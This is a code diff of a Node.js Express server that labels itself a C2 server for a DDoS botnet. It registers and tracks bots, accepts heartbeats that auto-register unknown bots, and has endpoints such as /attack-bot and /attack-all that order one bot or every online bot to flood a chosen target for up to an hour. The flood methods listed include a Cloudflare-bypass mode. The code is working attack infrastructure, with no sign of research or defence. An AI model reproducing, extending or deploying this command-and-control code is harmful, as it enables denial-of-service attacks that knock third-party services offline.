@@ -10,26 +10,19 @@ app.use(express.json());
 const port = process.env.PORT || 5553;
 const AUTH_TOKEN = "ricardo";
 
-// ========== TRUST PROXY (FIX FOR RENDER) ==========
-// Enable trust proxy to handle X-Forwarded-For headers properly
+// Trust proxy for Render
 app.set('trust proxy', 1);
 
-// ========== RATE LIMITING (FIXED) ==========
+// Rate limiting - fixed
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 1000,
-  // Skip rate limiting for the ping endpoint
   skip: (req) => req.path === '/ping',
-  // Use simple key generator to avoid X-Forwarded-For issues
-  keyGenerator: (req) => {
-    return req.ip || req.connection.remoteAddress || 'unknown';
-  }
+  keyGenerator: (req) => req.ip || req.connection.remoteAddress || 'unknown'
 });
-
-// Apply rate limiting only to API endpoints
 app.use('/api/', limiter);
 
-// ========== AUTH MIDDLEWARE ==========
+// Auth middleware
 const authenticate = (req, res, next) => {
   const token = req.headers['authorization'] || req.query.token;
   if (token !== AUTH_TOKEN) {
@@ -38,14 +31,13 @@ const authenticate = (req, res, next) => {
   next();
 };
 
-// ========== DATA STORES ==========
+// Data stores
 let connectedBots = [];
 let pendingCommands = {};
 let stopCommands = new Set();
 let blockedBots = new Set();
 let attackHistory = [];
 
-// ========== STATS ==========
 let serverStats = {
   totalAttacks: 0,
   activeAttacks: 0,
@@ -57,9 +49,9 @@ let serverStats = {
   uptime: 0
 };
 
-const BOT_TIMEOUT = 30000;
+const BOT_TIMEOUT = 30000; // 30 seconds
 
-// ========== CLEANUP ==========
+// Cleanup inactive bots
 function cleanupInactiveBots() {
   const now = Date.now();
   const before = connectedBots.length;
@@ -87,7 +79,7 @@ setInterval(() => {
   serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
 }, 5000);
 
-// ========== METHOD FILES ==========
+// Method files mapping
 const methodFiles = {
   'RAW-GET': 'methods/raw-get.js',
   'CF-BYPASS': 'methods/cf-bypass.js',
@@ -112,10 +104,7 @@ const methodFiles = {
 // ========== BOT ENDPOINTS ==========
 app.post('/register', (req, res) => {
   const { id, name, url } = req.body;
-  
-  if (!id) {
-    return res.status(400).json({ error: 'Bot ID required' });
-  }
+  if (!id) return res.status(400).json({ error: 'Bot ID required' });
 
   if (blockedBots.has(id)) {
     console.log(`[BLOCKED] Bot tried to register: ${id}`);
@@ -140,11 +129,42 @@ app.post('/register', (req, res) => {
     attackEndTime: 0,
     attacksPerformed: 0
   };
-  
   connectedBots.push(newBot);
   serverStats.totalBots = connectedBots.length;
   console.log(`[REGISTER] New bot: ${newBot.name} (${id}) (total: ${connectedBots.length})`);
   res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
+});
+
+// Heartbeat endpoint - keeps bot alive
+app.post('/heartbeat', (req, res) => {
+  const { id } = req.body;
+  if (!id) return res.status(400).json({ error: 'Bot ID required' });
+
+  const bot = connectedBots.find(b => b.id === id);
+  if (bot) {
+    bot.lastSeen = Date.now();
+    return res.json({ status: 'ok' });
+  }
+
+  // Auto-register if not blocked
+  if (!blockedBots.has(id)) {
+    const newBot = {
+      id,
+      name: `Bot-${id.slice(-6)}`,
+      url: 'unknown',
+      registeredAt: new Date().toISOString(),
+      lastSeen: Date.now(),
+      attacking: false,
+      attackEndTime: 0,
+      attacksPerformed: 0
+    };
+    connectedBots.push(newBot);
+    serverStats.totalBots = connectedBots.length;
+    console.log(`[HEARTBEAT] Auto-registered bot: ${id}`);
+    return res.json({ status: 'registered' });
+  }
+
+  res.status(403).json({ error: 'Bot is blocked' });
 });
 
 app.get('/get-command', (req, res) => {
@@ -152,7 +172,9 @@ app.get('/get-command', (req, res) => {
   if (!botId) return res.status(400).json({ error: 'Bot ID required' });
 
   const bot = connectedBots.find(b => b.id === botId);
-  if (bot) bot.lastSeen = Date.now();
+  if (bot) {
+    bot.lastSeen = Date.now(); // update lastSeen on poll
+  }
 
   if (stopCommands.has(botId)) {
     stopCommands.delete(botId);
@@ -171,7 +193,6 @@ app.get('/get-command', (req, res) => {
 
 app.post('/api/report', authenticate, (req, res) => {
   const { botId, target, method, requests, duration } = req.body;
-
   serverStats.totalRequests += requests || 0;
   serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
   serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;
@@ -181,7 +202,6 @@ app.post('/api/report', authenticate, (req, res) => {
     bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
     bot.lastReport = Date.now();
   }
-
   console.log(`[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
   res.json({ success: true });
 });
@@ -198,10 +218,7 @@ app.get('/bots', authenticate, (req, res) => {
     online: (now - bot.lastSeen) < BOT_TIMEOUT,
     attacksPerformed: bot.attacksPerformed || 0
   }));
-  res.json({
-    total: connectedBots.length,
-    bots: botsWithStatus
-  });
+  res.json({ total: connectedBots.length, bots: botsWithStatus });
 });
 
 app.get('/api/stats', authenticate, (req, res) => {
@@ -226,71 +243,48 @@ app.get('/attack-bot', authenticate, (req, res) => {
   if (!bot || !target || !time || !methods) {
     return res.json({ success: false, error: 'Missing parameters' });
   }
-
   const duration = parseInt(time);
   if (isNaN(duration) || duration < 1 || duration > 3600) {
     return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
   }
-
   const botObj = connectedBots.find(b => b.id === bot);
   if (!botObj) {
     return res.json({ success: false, error: 'Bot not found' });
   }
-
   botObj.attacking = true;
   botObj.attackEndTime = Date.now() + duration * 1000;
-
   pendingCommands[botObj.id] = {
     target: target,
     time: duration,
     methods: methods,
     timestamp: Date.now()
   };
-
   serverStats.totalAttacks++;
   serverStats.activeAttacks++;
   serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
   serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;
-
   console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${botObj.name} (${botObj.id}) for ${duration}s`);
   res.json({ success: true, message: 'Command sent to bot' });
 });
 
-// ========== ATTACK-ALL ENDPOINT (FIXED) ==========
 app.get('/attack-all', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
-  
-  // Validate parameters
   if (!target || !time || !methods) {
-    return res.status(400).json({ 
-      success: false, 
-      error: 'Missing parameters: target, time, methods' 
-    });
+    return res.status(400).json({ success: false, error: 'Missing parameters: target, time, methods' });
   }
-
   const duration = parseInt(time);
   if (isNaN(duration) || duration < 1 || duration > 3600) {
-    return res.status(400).json({ 
-      success: false, 
-      error: 'Invalid time (1-3600 seconds)' 
-    });
+    return res.status(400).json({ success: false, error: 'Invalid time (1-3600 seconds)' });
   }
 
-  // Get online bots
   const now = Date.now();
   const onlineBots = connectedBots.filter(b => (now - b.lastSeen) < BOT_TIMEOUT);
-  
   if (onlineBots.length === 0) {
-    return res.status(404).json({ 
-      success: false, 
-      error: 'No online bots available' 
-    });
+    return res.status(404).json({ success: false, error: 'No online bots available' });
   }
 
-  // Send command to all online bots
   let sentCount = 0;
   const failedBots = [];
-
   for (const bot of onlineBots) {
     try {
       bot.attacking = true;
@@ -304,20 +298,16 @@ app.get('/attack-all', authenticate, (req, res) => {
       sentCount++;
     } catch (error) {
       failedBots.push(bot.id);
-      console.error(`[ERROR] Failed to send command to ${bot.id}: ${error.message}`);
     }
   }
-
-  // Update stats
   serverStats.totalAttacks += sentCount;
   serverStats.activeAttacks += sentCount;
   serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + sentCount;
   serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + sentCount;
 
   console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${sentCount}/${onlineBots.length} bots for ${duration}s`);
-  
-  res.json({ 
-    success: true, 
+  res.json({
+    success: true,
     message: `Attack sent to ${sentCount} bots`,
     sent: sentCount,
     total: onlineBots.length,
@@ -325,7 +315,6 @@ app.get('/attack-all', authenticate, (req, res) => {
   });
 });
 
-// ========== STOP ALL ==========
 app.get('/stop-all', authenticate, (req, res) => {
   pendingCommands = {};
   for (const bot of connectedBots) {
@@ -338,7 +327,6 @@ app.get('/stop-all', authenticate, (req, res) => {
   res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
 });
 
-// ========== BLOCK/UNBLOCK/REMOVE ==========
 app.get('/block-bot', authenticate, (req, res) => {
   const { bot } = req.query;
   if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
@@ -372,7 +360,6 @@ app.get('/remove-bot', authenticate, (req, res) => {
   res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
 });
 
-// ========== METHODS LIST ==========
 app.get('/methods', authenticate, (req, res) => {
   const available = Object.keys(methodFiles).filter(name => {
     const filePath = path.join(__dirname, methodFiles[name]);
@@ -381,31 +368,26 @@ app.get('/methods', authenticate, (req, res) => {
   res.json({ methods: available, total: available.length });
 });
 
-// ========== PING ==========
 app.get('/ping', (req, res) => {
-  res.json({ 
-    alive: true, 
-    timestamp: Date.now(), 
+  res.json({
+    alive: true,
+    timestamp: Date.now(),
     bots: connectedBots.length,
     uptime: serverStats.uptime
   });
 });
 
 app.get('/health', (req, res) => {
-  res.json({ 
-    status: 'healthy', 
-    bots: connectedBots.length,
-    uptime: serverStats.uptime
-  });
+  res.json({ status: 'healthy', bots: connectedBots.length, uptime: serverStats.uptime });
 });
 
-// ========== ERROR HANDLER ==========
+// Error handler
 app.use((err, req, res, next) => {
   console.error('[ERROR]', err.message);
   res.status(500).json({ error: 'Internal server error' });
 });
 
-// ========== START ==========
+// Start
 app.listen(port, () => {
   console.log('\n========================================');
   console.log('🔥 C2 SERVER READY');
@@ -415,6 +397,7 @@ app.listen(port, () => {
   console.log('📊 Bot Registration: ID-based');
   console.log('📡 Endpoints:');
   console.log('  - POST /register (bot registration)');
+  console.log('  - POST /heartbeat (keep alive)');
   console.log('  - GET /bots (list bots)');
   console.log('  - GET /api/stats (stats)');
   console.log('  - GET /attack-bot (attack single bot)');
